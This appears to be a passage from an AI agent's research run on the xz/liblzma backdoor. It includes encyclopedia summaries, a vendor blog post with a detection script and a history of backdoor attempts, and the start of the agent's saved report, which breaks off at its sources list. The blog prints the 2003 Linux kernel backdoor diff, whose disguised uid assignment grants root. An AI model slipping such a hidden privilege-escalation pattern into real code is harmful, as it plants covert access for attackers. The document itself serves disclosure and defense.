      "Summary: In February 2024, a malicious backdoor was introduced to the Linux build of the xz utility within the liblzma library in versions 5.6.0 and 5.6.1 by an account using the name \"Jia Tan\". The backdoor gives an attacker who possesses a specific Ed448 private key remote code execution through OpenSSH on the affected Linux system. The issue has been given the Common Vulnerabilities and Exposures number CVE-2024-3094 and has been assigned a CVSS score of 10.0, the highest possible score.\n",
      "While xz is commonly present in most Linux distributions, at the time of discovery the backdoored version had not yet been widely deployed to production systems, but was present in development versions of major distributions. The backdoor was discovered by the software developer Andres Freund, who announced his findings on 29 March 2024.\n",
      "\n",
      "Page: XZ Utils\n",
      "Summary: XZ Utils (previously LZMA Utils) is a set of free software command-line lossless data compressors, including the programs lzma and xz, for Unix-like operating systems and, from version 5.0 onwards, Microsoft Windows. For compression/decompression the Lempel–Ziv–Markov chain algorithm (LZMA) is used. XZ Utils started as a Unix port of Igor Pavlov's LZMA-SDK that has been adapted to fit seamlessly into Unix environments and their usual structure and behavior.\n",
      "\n",
      "Page: Backdoor (computing)\n",
      "Summary: A backdoor is a typically covert method of bypassing normal authentication or encryption in a computer, product, embedded device (e.g. a home router), or its embodiment (e.g. part of a cryptosystem, algorithm, chipset, or even a \"homunculus computer\"—a tiny computer-within-a-computer such as that found in Intel's AMT technology). Backdoors are most often used for securing remote access to a computer, or obtaining access to plaintext in cryptosystems. From there it may be used to gain access to privileged information like passwords, corrupt or delete data on hard drives, or transfer information within autoschediastic networks.\n",
      "In the United States, the 1994 Communications Assistance for Law Enforcement Act forces internet providers to provide backdoors for government authorities.  In 2024, the U.S. government realized that China had been tapping communications in the U.S. using that infrastructure for months, or perhaps longer; China recorded presidential candidate campaign office phone calls —including employees of the then-vice president of the nation– and of the candidates themselves.\n",
      "A backdoor may take the form of a hidden part of a program, a separate program (e.g. Back Orifice may subvert the system through a rootkit), code in the firmware of the hardware, or parts of an operating system such as Windows. Trojan horses can be used to create vulnerabilities in a device. A Trojan horse may appear to be an entirely legitimate program, but when executed, it triggers an activity that may install a backdoor. Although some are secretly installed, other backdoors are deliberate and widely known. These kinds of backdoors have \"legitimate\" uses such as providing the manufacturer with a way to restore user passwords.\n",
      "Many systems that store information within the cloud fail to create accurate security measures. If many systems are connected within the cloud, hackers can gain access to all other platforms through the most vulnerable system. Default passwords (or other default credentials) can function as backdoors if they are not changed by the user. Some debugging features can also act as backdoors if they are not removed in the release version. In 1993, the United States government attempted to deploy an encryption system, the Clipper chip, with an explicit backdoor for law enforcement and national security access. The chip was unsuccessful.\n",
      "Recent proposals to counter backdoors include creating a database of backdoors' triggers and then using neural networks to detect them.\n",

Since then, the industry and community have produced a number of analyses and facts about this attack. While the situation is still developing, we now have a better collective understanding of how the attack took place and its impact.This post provides the key points to be aware of. We take care of minimizing information duplication and instead curate a list of high-quality external references. Finally, as \"what's old is new,\" we share a history of attempts to backdoor open source software—dating as far back as 49 years ago.Key points and observationsOn March 28, 2024, a backdoor was identified in the popular xz-utils package and reported to the oss-security@openwall mailing list one day later, on March 29. It was assigned CVE-2024-3094 and affects versions 5.6.0 and 5.6.1.When infecting a system, the backdoor would change the behavior of the sshd binary and allow an attacker with knowledge of a specific private key to remotely execute arbitrary code on the machine.The backdoor has been packaged in the several Linux distributions for several days:-  Fedora Linux 40 beta and Fedora Rawhide (see advisory)-  Debian unstable, testing, and experimental (see advisory)- Kali Linux (see advisory)- Arch Linux 2024.03.01, VM images 20240301.218094 to 20240315.221711 and container images created between and including 2024-02-24 and 2024-03-28 (see advisory)- The full list of distributions embedding vulnerable versions can be found on RepologyTo the best of the industry's knowledge, the backdoor has not been packaged in other widely used distributions such as Ubuntu or Amazon Linux.The attack has attracted extensive industry and media coverage and is widely regarded as an advanced, multi-year, and likely state-sponsored operation.How the backdoor worksWhen a malicious version of the xz-utils library is installed, a malicious shared object (SO) file is stored on disk. On Linux-based OSes, SO files are analogous to Windows DLLs.The SSH server binary sshd is, like many binaries, dynamically linked. This causes it to load shared libraries from disk when it starts, by design. When sshd starts, it loads the malicious SO file from disk. This file contains the actual backdoor, which you'll see referred to as the \"payload.\"Under certain (common) conditions, the backdoor hijacks a specific OpenSSL function, RSA_public_decrypt. While the SSH server believes it's calling OpenSSL, it's actually calling the backdoor. The backdoor embeds a mechanism that allows an attacker with knowledge of a specific private SSH key to execute arbitrary code on the machine. It preserves usual functionality, so that SSH features keep working as usual, to stay under the radar.External references and analysisBelow, we share external references you can pick from depending on what makes most sense for you to read about.Reporting from mainstream media:New York TimesThe VergeThe InterceptCERT advisories: CERT-EU, CISA, CIRCL-LU\"Historical\" official references:Initial report of the backdoor to oss-security@openwallStatement from the original xz-utils maintainer, regularly updatedXZ: Repo maintainer Lasse Collin responding on LKML\"Comprehensive\" references:FAQ on the xz-utils backdoor (CVE-2024-3094), by a Gentoo developerTimeline of the xz open source attackEverything I Know About the XZ BackdoorOSINT analysis:XZ Backdoor: Times, damned times, and scamsThe Mystery of ‘Jia Tan,’ the XZ Backdoor MastermindIn-depth analysis of the backdoor and/or delivery mechanism:XZ Backdoor Analysis and symbol mappingThe xz attack shell scriptxz/liblzma: Bash-stage Obfuscation ExplainedXz: Can you spot the single character that disabled Linux landlock?Putting an xz Backdoor Payload in a Valid RSA KeyFilippo Valsorda's analysisDetection advice from Jack NaglieriThe xz backdoor also includes an authentication bypass componentReproduction and open source:xzbotxz-vulnerable-honeypotJiaTansSSHAgentInfographics:https://infosec.exchange/@fr0gger/112189232773640259Discussion and higher-level analysis:Techies vs spies: the xz backdoor debateA Microcosm of the interactions in Open Source projectsOSS backdoors: the folly of the easy fixRe: Three steps we could take to make supply chain attacks a bit harderReflections on Distrusting xzHow to check if you're affectedTo check if a system is affected, you can run xz --version. If the output contains 5.6.0 or 5.6.1, it means you're likely running a backdoor version of xz.As relying on a potentially backdoored binary isn't ideal, you can also use the detect_sh script that was shared on the OpenWall mailing list:#! /bin/bashset -eu# find path to liblzma used by sshdpath=\"$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]*')\"# does it even exist?if [ \"$path\" == \"\" ]then\techo probably not vulnerable\texitfi# check for function signatureif hexdump -ve '1/1 \"%.2x\"' \"$path\" | grep -q f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410then\techo probably vulnerableelse\techo probably not vulnerablefiHow Datadog can helpDatadog Cloud Security Management (CSM) customers can use CSM Vulnerabilities to identify any virtual machine or container that has been infected with the backdoor, using the query status:Open cve:CVE-2024-3094 (direct link).Hovering your mouse over any affected virtual machine or container allows you to benefit from additional context such as the cloud account it's running in, operating system and misconfigurations that may affect it. It also enables you to easily pivot to observability data such as logs or network connections.A host affected by a vulnerability (click to enlarge)A history of backdooring attempts across the agesWhile this supply chain attack on the XZ project is sophisticated and received extensive coverage, it's not the first time that actors have attempted (or succeeded) to backdoor software projects. When something big happens, it's always good to pause and look back. In this section, we tell a few stories from 1975 to 2023 that relate to attempts to backdoor legitimate code.This list is not exhaustive, but it does showcase that attempts to backdoor code are not new and have taken a number of forms throughout the years. The CNCF TAG Security maintains a list of incidents that, while not comprehensive, catalogs the major events in supply chain security.1975: The original \"meta\" backdoorIn 1984, Turing Award winner Ken Thompson published a paper entitled \"Reflections on Trusting Trust\", where he tells the story of how he had, nearly 10 years earlier, embedded a backdoor into a compiler and disassembler, making it impossible to track by auditing the source code or using the disassembler to examine the malicious machine code.According to Thomson himself (through secondary research), his backdoor made it to the login command of Bell Labs' Unix Support Group, before being detected a few months later.2003: The Linux KernelIn 2003, an unknown actor published a malicious patch to a source control repository of the Linux Kernel:--- GOOD        2003-11-05 13:46:44.000000000 -0800+++ BAD 2003-11-05 13:46:53.000000000 -0800@@ -1111,6 +1111,8 @@                schedule();                goto repeat;        }+       if ((options == (__WCLONE|__WALL)) && (current->uid = 0))+                       retval = -EINVAL;        retval = -ECHILD; end_wait4:        current->state = TASK_RUNNING;This backdoor would have allowed an attacker with knowledge of the 'options' mechanism to escalate their privileges to the root user on any affected system, due to the fake comparison of current->uid with 0 (which is actually a value assignment). Thankfully, maintainers of the kernel caught and removed the malicious code.2012: The Ruby on Rails source code through a GitHub vulnerabilityAfter discovering a vulnerability on GitHub, an individual was able to add their own public key to the popular Ruby on Rails GitHub repository by changing their user ID in an SSH key management feature to that of the targeted project. This addition was used to publish an unreviewed commit to the framework’s main branch. They also shared a write-up on how they had achieved this, while the vulnerability was still present. Additional analysis of this issue was provided by GitHub and a secondary researcher.2021: The PHP source codeIn March 2021, hackers breached an internal git server of the PHP source code and embedded a malicious change under the names of existing project maintainers. Had it not been caught, it would have allowed attackers to run arbitrary code in any PHP application accepting HTTP requests by providing a specifically crafted HTTP header User-Agentt (sic).2021: Linux hypocrite commitsStill in 2021, researchers of the University of Minnesota embarked on a controversial (and at the time secret) research project entitled On the Feasibility of Stealthily Introducing Vulnerabilities in Open Source Software via Hypocrite Commits. They submitted a number of intentionally vulnerable or malicious patches and measured how many would be accepted in the stable branch.Catch rate of Linux hypocrite commits (click to enlarge)As can be seen from the table above, lots of their malicious changes did go through and ended up being reverted soon after by a maintainer.2023: Fake Dependabot commitsIn 2023, researchers identified a malicious actor attempting to pose as Dependabot, an application that keeps third-party dependencies up to date, in order to create malicious pull requests in hundreds of repositories. The malicious actor created falsified commit messages and inserted code to steal GitHub secrets and user passwords from victims using compromised contributor accounts.Backdoors go beyond codeWe've seen a few examples that backdoors in open source software go beyond the XZ story. But it's more than that: they go beyond software, as the following examples show:As part of Operation Rubicon, the CIA backdoored encryption devices sold by the Switzerland-based company Crypto AG, starting as early as 1970. This was performed with full knowledge of the Swiss secret services, as outlined by a recent parliamentary report available in French and German.The NSA has attempted to introduce an intentional backdoor in an RSA ciphersuite, Dual_EC_DRBG, so it could covertly decrypt communications secured with protocols such as SSL.Documents from the Snowden case demonstrate that in 2013, the NSA had a $250M yearly budget to \"insert vulnerabilities into commercial encryption systems, IT systems, networks, and endpoint communications devices.\"ConclusionThe XZ backdoor is one of many publicly documented supply chain attacks—but it stands out for its complexity, both from a technical and human perspective, with the attacker having spent years preparing for the attack. Although the current consensus is that the campaign likely originates from a state-sponsored actor, there remain many unknowns about the attack. Security researchers will continue to investigate this threat for some time to come and will likely uncover more details about its nature and origins in the future.Updates made to this entryApril 8, 2024Added a link to a new open-source project, and clarified that the XZ backdoor is now believed to also include an authentication bypass.twitterreddit            Did you find this article helpful?

      "Invoking: `Save_to_File` with `{'content': '# XZ Backdoor (CVE-2024-3094) Research\\n\\n## Overview\\nIn February 2024, a malicious backdoor was introduced to the Linux build of the xz utility within the liblzma library in versions 5.6.0 and 5.6.1 by an account using the name \"Jia Tan\". This backdoor allows an attacker who possesses a specific Ed448 private key to execute remote code on the affected Linux system. The vulnerability has been assigned the Common Vulnerabilities and Exposures (CVE) number CVE-2024-3094 and has a CVSS score of 10.0, the highest possible score.\\n\\n## Discovery\\nThe backdoor was discovered by software developer Andres Freund, who announced his findings on March 29, 2024. It was reported that the backdoor had not yet been widely deployed to production systems but was present in development versions of major Linux distributions.\\n\\n## Technical Details\\nThe backdoor works by modifying the behavior of the SSH server binary (sshd). When a malicious version of the xz-utils library is installed, a malicious shared object (SO) file is stored on disk. This SO file is loaded by the sshd binary when it starts, allowing the backdoor to hijack a specific OpenSSL function, RSA_public_decrypt. This enables an attacker with knowledge of the specific private SSH key to execute arbitrary code on the machine while preserving the usual functionality of SSH.\\n\\n### Affected Distributions\\nThe backdoor was packaged in several Linux distributions, including:\\n- Fedora Linux 40 beta and Fedora Rawhide\\n- Debian unstable, testing, and experimental\\n- Kali Linux\\n- Arch Linux (specific VM and container images)\\n\\nHowever, it was noted that the backdoor had not been packaged in widely used distributions such as Ubuntu or Amazon Linux.\\n\\n## Response and Mitigation\\nThe U.S. Cybersecurity and Infrastructure Security Agency (CISA) has recommended organizations downgrade to a previous non-compromised version of XZ Utils. Users can check if their system is affected by running `xz --version` and looking for versions 5.6.0 or 5.6.1.\\n\\n## Historical Context\\nThe XZ backdoor is part of a broader trend of supply chain attacks targeting open-source software. Historical examples include attempts to backdoor the Linux Kernel and other significant software projects.\\n\\n## Conclusion\\nThe XZ backdoor represents a sophisticated supply chain attack, likely state-sponsored, that has raised significant concerns within the cybersecurity community. Ongoing investigations are expected to reveal more about the nature and origins of this threat.\\n\\n## Sources\\n1.
